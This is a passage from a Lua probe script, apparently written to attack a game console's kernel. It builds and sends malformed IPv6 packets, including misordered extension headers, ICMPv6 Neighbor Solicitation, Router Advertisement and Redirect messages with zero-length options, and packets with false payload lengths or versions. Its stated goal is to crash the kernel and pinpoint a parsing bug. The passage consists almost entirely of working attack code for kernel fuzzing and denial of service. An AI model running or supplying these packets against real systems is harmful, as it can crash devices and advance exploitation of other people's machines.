    -- Only 8 bytes of extension, kernel will read past buffer looking for next
    send_ipv6(buf, off + 8, "F3: dest opts chain loops (next=self, short pkt)")
end

-- F4: Hop-by-Hop NOT first (RFC requires HBH to be first after IPv6 header)
do
    local buf = memory.alloc(80)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_DSTOPTS)  -- starts with dest opts
    -- Dest → HopByHop (WRONG ORDER per RFC)
    safe_wb(buf + off, IPPROTO_HOPOPTS)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 1); safe_wb(buf + off + 3, 4)
    safe_wd(buf + off + 4, 0)
    -- HopByHop → None
    safe_wb(buf + off + 8, IPPROTO_NONE)
    safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 1); safe_wb(buf + off + 11, 4)
    safe_wd(buf + off + 12, 0)
    send_ipv6(buf, off + 16, "F4: HBH not first (RFC violation, Dest→HBH)")
end

-- F5: Extension header with next_header = 0 (HBH) in the middle — parser confusion
do
    local buf = memory.alloc(80)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_ROUTING)
    -- Routing → 0 (Hop-by-hop, invalid mid-chain)
    safe_wb(buf + off, IPPROTO_HOPOPTS)
    safe_wb(buf + off + 1, 0)
    safe_wb(buf + off + 2, 0); safe_wb(buf + off + 3, 0)
    safe_wd(buf + off + 4, 0)
    -- "Hop-by-Hop" → None
    safe_wb(buf + off + 8, IPPROTO_NONE)
    safe_wb(buf + off + 9, 0)
    safe_wb(buf + off + 10, 1); safe_wb(buf + off + 11, 4)
    safe_wd(buf + off + 12, 0)
    send_ipv6(buf, off + 16, "F5: Routing→HBH mid-chain (invalid)")
end

print("")

-- ============================================
-- SECTION G: ICMPv6 specific attacks
-- ============================================
print("--- SECTION G: ICMPv6 attacks ---")
print("  Targets: icmp6_input(), nd6_ns_input(), nd6_na_input()")
print("")

-- ICMPv6 goes through ip6_input() → icmp6_input() in kernel
-- Key types: Neighbor Solicitation (135), Neighbor Advertisement (136),
-- Router Solicitation (133), Router Advertisement (134),
-- Redirect (137), Echo Request (128), Echo Reply (129)

-- Build ICMPv6 packet with next_header = 58
local function build_icmpv6(buf, offset, icmp_type, icmp_code, payload_bytes)
    -- ICMPv6 header: type(1) + code(1) + checksum(2) + body(4+)
    safe_wb(buf + offset, icmp_type)
    safe_wb(buf + offset + 1, icmp_code)
    safe_ww(buf + offset + 2, 0)       -- checksum (kernel may validate)
    return 4
end

-- G1: Neighbor Solicitation with no target address (too short)
do
    local buf = memory.alloc(80)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_ICMPV6)
    safe_wb(buf + off, 135)            -- NS type
    safe_wb(buf + off + 1, 0)          -- code
    safe_ww(buf + off + 2, 0)          -- checksum
    safe_wd(buf + off + 4, 0)          -- reserved
    -- Missing: 16-byte target address
    send_ipv6(buf, off + 8, "G1: NS too short (no target addr)")
end

-- G2: Neighbor Solicitation with malformed option
do
    local buf = memory.alloc(128)
    local off = build_ipv6_hdr(buf, 0, 32, IPPROTO_ICMPV6)
    safe_wb(buf + off, 135)            -- NS
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 0)          -- reserved
    -- Target: ::1
    for i = 0, 14 do safe_wb(buf + off + 8 + i, 0) end
    safe_wb(buf + off + 23, 1)
    -- ND option: type=1 (source link-layer), length=0 (INVALID — causes divide by zero or loop)
    safe_wb(buf + off + 24, 1)         -- type = source link-layer addr
    safe_wb(buf + off + 25, 0)         -- length = 0 (BUG: this means 0 bytes, parser may loop!)
    safe_wb(buf + off + 26, 0xDE)
    safe_wb(buf + off + 27, 0xAD)
    safe_wd(buf + off + 28, 0)
    send_ipv6(buf, off + 32, "G2: NS with option length=0 (parser loop/crash)")
end

-- G3: Router Advertisement with huge prefix info
do
    local buf = memory.alloc(128)
    local off = build_ipv6_hdr(buf, 0, 40, IPPROTO_ICMPV6)
    safe_wb(buf + off, 134)            -- RA type
    safe_wb(buf + off + 1, 0)          -- code
    safe_ww(buf + off + 2, 0)          -- checksum
    safe_wb(buf + off + 4, 64)         -- cur hop limit
    safe_wb(buf + off + 5, 0xC0)       -- M=1, O=1
    safe_ww(buf + off + 6, 0xFFFF)     -- router lifetime = max
    safe_wd(buf + off + 8, 0xFFFFFFFF) -- reachable time = max
    safe_wd(buf + off + 12, 0xFFFFFFFF) -- retrans timer = max
    -- Prefix Information option (type=3, len=4=32 bytes)
    safe_wb(buf + off + 16, 3)         -- type = prefix info
    safe_wb(buf + off + 17, 4)         -- length = 4 (32 bytes)
    safe_wb(buf + off + 18, 128)       -- prefix length = 128
    safe_wb(buf + off + 19, 0xC0)      -- L=1, A=1
    safe_wd(buf + off + 20, 0xFFFFFFFF) -- valid lifetime = max
    safe_wd(buf + off + 24, 0xFFFFFFFF) -- preferred lifetime = max
    safe_wd(buf + off + 28, 0)         -- reserved2
    -- Prefix: ::1
    for i = 0, 14 do safe_wb(buf + off + 32 + i, 0) end
    safe_wb(buf + off + 47, 1)
    send_ipv6(buf, off + 48, "G3: RA with prefix /128 max lifetimes")
end

-- G4: Redirect to ::1 with oversized option
do
    local buf = memory.alloc(128)
    local off = build_ipv6_hdr(buf, 0, 48, IPPROTO_ICMPV6)
    safe_wb(buf + off, 137)            -- Redirect type
    safe_wb(buf + off + 1, 0)          -- code
    safe_ww(buf + off + 2, 0)          -- checksum
    safe_wd(buf + off + 4, 0)          -- reserved
    -- Target: ::1
    for i = 0, 14 do safe_wb(buf + off + 8 + i, 0) end
    safe_wb(buf + off + 23, 1)
    -- Destination: ::1
    for i = 0, 14 do safe_wb(buf + off + 24 + i, 0) end
    safe_wb(buf + off + 39, 1)
    -- Redirected header option with length=0 (invalid)
    safe_wb(buf + off + 40, 4)         -- type = Redirected Header
    safe_wb(buf + off + 41, 0)         -- length = 0 (INVALID)
    safe_wd(buf + off + 42, 0)
    safe_ww(buf + off + 46, 0)
    send_ipv6(buf, off + 48, "G4: Redirect with option length=0")
end

-- G5: Echo Request with maximum padding (stress icmp6_input)
do
    local big_payload = 1024
    local buf = memory.alloc(40 + 8 + big_payload + 16)
    local off = build_ipv6_hdr(buf, 0, 8 + big_payload, IPPROTO_ICMPV6)
    safe_wb(buf + off, 128)            -- Echo Request
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)          -- checksum
    safe_ww(buf + off + 4, 0x1234)     -- identifier
    safe_ww(buf + off + 6, 0x0001)     -- sequence
    for i = 0, big_payload - 1 do
        safe_wb(buf + off + 8 + i, i % 256)
    end
    send_ipv6(buf, off + 8 + big_payload, "G5: Echo Request 1KB payload")
end

-- G6: ICMPv6 with invalid type (200+)
for _, itype in ipairs({200, 201, 254, 255}) do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_ICMPV6)
    safe_wb(buf + off, itype)
    safe_wb(buf + off + 1, 0)
    safe_ww(buf + off + 2, 0)
    safe_wd(buf + off + 4, 0xDEADBEEF)
    send_ipv6(buf, off + 8, string.format("G6: ICMPv6 type=%d (unknown)", itype))
end

print("")

-- ============================================
-- SECTION H: No Next Header (type 59) edge cases
-- ============================================
print("--- SECTION H: No Next Header (type 59) ---")
print("")

-- H1: IPv6 header with next=59 directly (no payload)
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 0, IPPROTO_NONE)  -- payload_len=0, next=59
    send_ipv6(buf, off, "H1: IPv6 next=59 (none) payload_len=0")
end

-- H2: IPv6 with next=59 but has trailing data
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 16, IPPROTO_NONE)  -- claims 16 bytes
    for i = 0, 15 do safe_wb(buf + off + i, 0xAA) end
    send_ipv6(buf, off + 16, "H2: IPv6 next=59 but payload_len=16")
end

print("")

-- ============================================
-- SECTION I: Payload length mismatches
-- ============================================
print("--- SECTION I: Payload length attacks ---")
print("")

-- I1: payload_len=0 with actual data
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 0, IPPROTO_UDP)  -- claims 0 payload
    -- But we send 16 bytes of UDP
    for i = 0, 15 do safe_wb(buf + off + i, 0xBB) end
    send_ipv6(buf, off + 16, "I1: payload_len=0 but 16B actually sent")
end

-- I2: payload_len=65535 (max) with tiny packet
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 65535, IPPROTO_UDP)  -- claims 65535 payload
    for i = 0, 7 do safe_wb(buf + off + i, 0xCC) end
    send_ipv6(buf, off + 8, "I2: payload_len=65535 but only 8B sent")
end

-- I3: Version not 6
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_NONE)
    -- Corrupt version to 4 (looks like IPv4 to parser)
    safe_wb(buf, 0x40)  -- version=4 instead of 6
    for i = 0, 7 do safe_wb(buf + off + i, 0xDD) end
    send_ipv6(buf, off + 8, "I3: version=4 in IPv6 packet (confusion)")
end

-- I4: Version = 0
do
    local buf = memory.alloc(64)
    local off = build_ipv6_hdr(buf, 0, 8, IPPROTO_NONE)
    safe_wb(buf, 0x00)  -- version=0
    for i = 0, 7 do safe_wb(buf + off + i, 0xEE) end
    send_ipv6(buf, off + 8, "I4: version=0 in IPv6 packet")
end

print("")

-- ============================================
-- SECTION J: Summary
-- ============================================
print("=== SUMMARY ===")
print("  Packets sent: " .. sent)
print("  Send errors: " .. errors)
print("")
print("  If console crashed/rebooted → kernel IPv6 extension header bug found!")
print("  Last test before crash = the suspect variant.")
print("")
print("  Key targets hit:")
print("    - ip6_hopopts()  — Hop-by-Hop parsing (B1-B7)")
print("    - ip6_rthdr()    — Routing headers including Type 0 CVE (C1-C6)")
print("    - frag6_input()  — Fragment reassembly + overlaps (D1-D6)")
print("    - ip6_destopt()  — Destination options (E1-E3)")
print("    - chain parsing  — Nested/chained/misordered headers (F1-F5)")
print("    - icmp6_input()  — NDP, RA, Redirect with malformed options (G1-G6)")
print("    - ip6_none_input — No Next Header edge cases (H1-H2)")
print("    - payload_len    — Length mismatches and version confusion (I1-I4)")
print("")

-- Cleanup
if raw6 then pcall(function() sc_close(uint64(raw6)) end) end
if icmp6_fd then pcall(function() sc_close(uint64(icmp6_fd)) end) end
if raw4_fd then pcall(function() sc_close(uint64(raw4_fd)) end) end

print("=== PROBE 48c COMPLETE ===")
